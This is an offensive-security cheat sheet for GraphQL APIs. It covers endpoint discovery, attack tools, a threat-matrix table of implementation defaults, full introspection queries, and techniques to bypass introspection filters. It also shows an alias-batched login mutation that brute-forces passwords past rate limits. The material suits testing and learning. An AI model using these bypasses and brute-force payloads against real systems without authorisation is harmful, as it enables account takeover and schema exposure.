# Content
- [Common endpoint names](#common-endpoint-names)
- [Attack GraphQL](#attack-graphql)
  - [Attack Surface](#attack-surface)
  - [Discovering schema information](#discovering-schema-information)
    - [using Introspection](#1-using-introspection)
    - [using Suggestions](#using-suggestions)   

# Common endpoint names 
- /graphql
- /api
- /api/graphql
- /graphql/api
- /graphql/graphql
- /playground
also try appending /v1 to the path.

# Attack GraphQL
## tools 
- [graphql-voyager is tool for Visualization](https://graphql-kit.com/graphql-voyager/)
- [graphw00f](https://github.com/dolevf/graphw00f)
- [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap)
- [batchql](https://github.com/assetnote/batchql)
- [graphql-cop](https://github.com/dolevf/graphql-cop), GraphQL Cop audits GraphQL servers for information disclosure and DoS-based vulnerabilities.
- [clairvoyance](https://github.com/nikitastupin/clairvoyance)
- [CrackQL](https://github.com/nicholasaleks/CrackQL)
- [graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum)

## Attack Surface

- according to [graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix)
- Use [graphw00f](https://github.com/dolevf/graphw00f) to fingerprint a target GraphQL API and determine the backend implementation.

<p>
<b>Legend</b><br>
✅ &nbsp;- Enabled by Default<br>
⚠️ &nbsp;- Disabled by Default<br>
❌ &nbsp;- No Support
</p>


<table>

<tr>
    <th>Implementation</th>
    <th>Validations</th>
    <th>Field Suggestions</th>
    <th>Query Depth limit</th>
    <th>Query Cost Analysis</th>
    <th>Automatic Persisted Queries</th>
    <th>Introspection</th>
    <th>Debug Mode</th>
    <th>Batch Requests</th>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/wp-graphql.md">wp-graphql</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/wp-graphql.md#Request-Validations">38</a></td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
    <td align="center">✅</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-php.md">graphql-php</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-php.md#Request-Validations">37</a></td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-api-for-wp.md">graphql-api-for-wp</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-api-for-wp.md#Request-Validations">37</a></td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">✅</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/apollo.md">Apollo</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/apollo.md#Request-Validations">34</a></td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
    <td align="center">✅</td>
    <td align="center">✅</td>
    <td align="center">✅</td>
    <td align="center">✅</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-yoga.md">graphql-yoga</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-yoga.md#Request-Validations">34</a></td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md">graphene</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md#Request-Validations">34</a></td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">⚠️</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/ariadne.md">Ariadne</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/ariadne.md#Request-Validations">34</a></td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/strawberry.md">Strawberry</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/strawberry.md#Request-Validations">34</a></td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-dotnet.md">graphql-dotnet</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-dotnent.md##Request-Validations">29</a></td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">⚠️</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-ruby.md">graphql-ruby</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-ruby.md##Request-Validations">28</a></td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/sangria.md">Sangria</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/sangria.md#Request-Validations">27</a></td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">⚠️</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/tartiflette.md">Tartiflette</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/tartiflette.md#Request-Validations">26</a></td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-java.md">graphql-java</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-java.md#Request-Validations">26</a></td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">⚠️</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/gqlgen.md">gqlgen</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/gqlgen.md#Request-Validations">25</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">⚠️</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/dgraph.md">Dgraph</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/dgraph.md#Request-Validations">25</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">⚠️</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-go.md">graphql-go</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphql-go.md#Request-Validations">24</a></td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/juniper.md">juniper</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/juniper.md#Request-Validations">24</a></td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">⚠️</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/diana.md">Diana.jl</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/diana.md#Request-Validations">10</a></td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/gql-dart.md">gql-dart/gql</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/gql-dart.md#Request-Validations">9</a></td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
</tr>

<tr>
    <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/agoo.md">Agoo</a></td>
    <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/agoo.md#Request-Validations">1</a></td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">❌</td>
    <td align="center">✅</td>
    <td align="center">⚠️</td>
    <td align="center">❌</td>
</tr>
<tr>
 <td><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/lighthouse.md">Lighthouse</a></td>
 <td align="center"><a href="https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/lighthouse.md#Request-Validations">1</a></td>
		<td align="center">✅</td>
		<td align="center">⚠️</td>
		<td align="center">⚠️</td>
		<td align="center">⚠️</td>
		<td align="center">✅</td>
		<td align="center">⚠️</td>
		<td align="center">✅</td>
</tr>

</table>

## Discovering schema information 

### 1) using Introspection
get names of all available queries. 
```graphql
{__schema{types{name,fields{name}}}}
```
get full scheme
```graphql
 query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

```json
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }

```


#### Bypassing GraphQL introspection defenses
- **manpulate the query**
You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.


for example if `__schema{` is ignored , try
```graphql
query{__schema
  {queryType{name}}
}

```

- **change request method or type**

```http
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

- **use aliases to bypass ratelimit**
```graphql
mutation {

bruteforce0:login(input:{password: "123456", username: "carlos"}) {
        token
        success
    }


bruteforce1:login(input:{password: "password", username: "carlos"}) {
        token
        success
    }


bruteforce2:login(input:{password: "12345678", username: "carlos"}) {
        token
        success
    }


bruteforce3:login(input:{password: "qwerty", username: "carlos"}) {
        token
        success
    }
}
```


### using Suggestions
this tool [Clairvoyance](https://github.com/nikitastupin/clairvoyance) can get the scheme info using suggestions 


